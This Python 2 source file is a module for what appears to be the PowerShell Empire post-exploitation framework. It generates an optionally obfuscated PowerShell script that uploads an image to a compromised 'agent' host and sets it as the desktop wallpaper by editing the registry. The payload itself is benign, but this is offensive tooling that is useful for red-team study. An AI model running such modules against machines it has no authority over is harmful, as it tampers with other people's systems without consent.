import base64
from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Set-Wallpaper',

            'Author': ['@harmj0y'],

            'Description': ('Uploads a .jpg image to the target and sets it as the desktop wallpaper.'),

            'Background' : False,

            'OutputExtension' : None,
            
            'NeedsAdmin' : False,

            'OpsecSafe' : False,

            'Language' : 'powershell',

            'MinLanguageVersion' : '2',
            
            'Comments': [
                'https://social.technet.microsoft.com/forums/scriptcenter/en-US/9af1769e-197f-4ef3-933f-83cb8f065afb/background-change'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'LocalImagePath' : {
                'Description'   :   'Local image path to set the agent wallpaper as.',
                'Required'      :   True,
                'Value'         :   ''
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self, obfuscate=False, obfuscationCommand=""):
        
        # Set-ItemProperty -Path 'HKCU:\\Control Panel\\Desktop\\' -Name wallpaper -Value $SavePath
        # rundll32.exe user32.dll, UpdatePerUserSystemParameters

        script = """
Function Set-WallPaper
{
    [CmdletBinding()] Param($WallpaperData)

    $SavePath = "$Env:UserProfile\\AppData\\Local\\wallpaper" + ".jpg"

    Set-Content -value $([System.Convert]::FromBase64String($WallpaperData)) -encoding byte -path $SavePath

add-type @"
using System;
using System.Runtime.InteropServices;
using Microsoft.Win32;
namespace Wallpaper
{
  public enum Style : int
  {
    Tiled, Centered, Stretched, Fit
  }


  public class Setter {
   public const int SetDesktopWallpaper = 20;
   public const int UpdateIniFile = 0x01;
   public const int SendWinIniChange = 0x02;

   [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
   private static extern int SystemParametersInfo (int uAction, int uParam, string lpvParam, int fuWinIni);
   
   public static void SetWallpaper ( string path, Wallpaper.Style style ) {
     SystemParametersInfo( SetDesktopWallpaper, 0, path, UpdateIniFile | SendWinIniChange );
     
     RegistryKey key = Registry.CurrentUser.OpenSubKey("Control Panel\\\\Desktop", true);
     switch( style )
     {
       case Style.Stretched :
         key.SetValue(@"WallpaperStyle", "2") ; 
         key.SetValue(@"TileWallpaper", "0") ;
         break;
       case Style.Centered :
         key.SetValue(@"WallpaperStyle", "1") ; 
         key.SetValue(@"TileWallpaper", "0") ; 
         break;
       case Style.Tiled :
         key.SetValue(@"WallpaperStyle", "1") ; 
         key.SetValue(@"TileWallpaper", "1") ;
         break;
       case Style.Fit :
         key.SetValue(@"WallpaperStyle", "6") ; 
         key.SetValue(@"TileWallpaper", "0") ;
         break;
     }
     key.Close();
   }
  }
}
"@ 

    $null = [Wallpaper.Setter]::SetWallpaper( (Convert-Path $SavePath), "Fit" )
} Set-Wallpaper"""

        fileName = self.options['LocalImagePath']['Value']

        if (fileName != ''):
            try:
                f = open(fileName)
                data = f.read()
                f.close()

                extension = "." + fileName.split(".")[-1]
                script.replace(".jpg", extension)

                script += " -WallpaperData \"" + base64.b64encode(data) + "\""
            except:
                print helpers.color("[!] Error reading local image path.")
                return ""
        else:
            print helpers.color("[!] Please specify a valid local image path.")
            return ""
        
        script += "; 'Set-Wallpaper executed'"
        if obfuscate:
            script = helpers.obfuscate(psScript=script, obfuscationCommand=obfuscationCommand)
        return script
